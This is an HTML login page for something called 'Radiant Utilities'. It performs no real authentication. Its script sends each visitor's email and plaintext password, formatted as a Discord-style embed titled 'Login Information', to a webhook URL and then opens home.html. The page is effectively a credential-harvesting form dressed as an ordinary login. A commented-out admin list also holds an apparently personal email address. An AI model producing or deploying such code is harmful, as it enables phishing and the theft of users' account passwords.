<!DOCTYPE html>
<html>
<head>
    <title>Radiant Utilities | Home</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="Server-modified.png" type="image/x-icon">
    <style>
        .content6 {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
        }

        input {
            margin-bottom: 10px;
        }

        .count {
            font-size: 12px;
            margin-top: 5px;
            text-align: center;
        }

        #email-count, #password-count {
            display: block;
        }
    </style>
</head>

<body>
    <main>
        <div class="content6">
            <h2>Login</h2>
            <input type="email" name="email" id="email-input" placeholder="Enter your email" required maxlength="100">
            <input type="password" name="password" id="password-input" placeholder="Enter your password" required maxlength="50">            
            <button id="myButton" class="custom-button" disabled onclick="window.open('home.html');"><span></span>Login</button>            
        </div>  
    
        <script>
            var emailInput = document.getElementsByName("email")[0];
            var passwordInput = document.getElementsByName("password")[0];
            var submitButton = document.getElementById("myButton");
            var webhookURL = "webhook";

            /*const adminEmails = ['olle1.grahn2@gmail.com', 'anotheradmin@example.com'];

            function hasAdminAccess(userEmail) {
            return adminEmails.includes(userEmail);
          }

            if (hasAdminAccess(userEmail)) {
              window.location.href = 'admin.html';
            } else {*/

            emailInput.addEventListener("input", function() {
              var email = this.value.trim();
              var emailRegex = /^\S+@\S+\.\S+$/;
              var password = passwordInput.value.trim();
              if (emailRegex.test(email) && password !== "") {
                submitButton.disabled = false;
              } else {
                submitButton.disabled = true;
              }
            });

            passwordInput.addEventListener("input", function() {
              var email = emailInput.value.trim();
              var emailRegex = /^\S+@\S+\.\S+$/;
              var password = this.value.trim();
              if (emailRegex.test(email) && password !== "") {
                submitButton.disabled = false;
              } else {
                submitButton.disabled = true;
              }
            });

            submitButton.addEventListener("click", function() {
              var email = emailInput.value.trim();
              var emailRegex = /^\S+@\S+\.\S+$/;
              var password = passwordInput.value.trim();
              if (emailRegex.test(email) && password !== "") {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", webhookURL, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.onreadystatechange = function() {
                  if (xhr.readyState === 4 && xhr.status === 200) {
        console.log("Webhook sent successfully!");
      }
    };
    var data = JSON.stringify({
      "embeds": [
        {
          "title": "Login Information",
          "description": "A new user has logged in",
          "color": 65280,
          "fields": [
            {
              "name": "Email",
              "value": email,
              "inline": true
            },
            {
              "name": "Password",
              "value": password,
              "inline": true
            }
          ]
        }
      ]
    });
    xhr.send(data);
    emailInput.value = "";
    passwordInput.value = "";
    submitButton.disabled = true;
  }
});
//}

    </script>

	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	<script>
		$(document).ready(function() {
			$('a[href^="#"]').on('click', function(event) {
				event.preventDefault();
				var target = this.hash;
				var $target = $(target);
				$('html, body').stop().animate({
					'scrollTop': $target.offset().top
				}, 900, 'swing', function() {
					window.location.hash = target;
				});
			});
		});
	</script>
</body>
</html>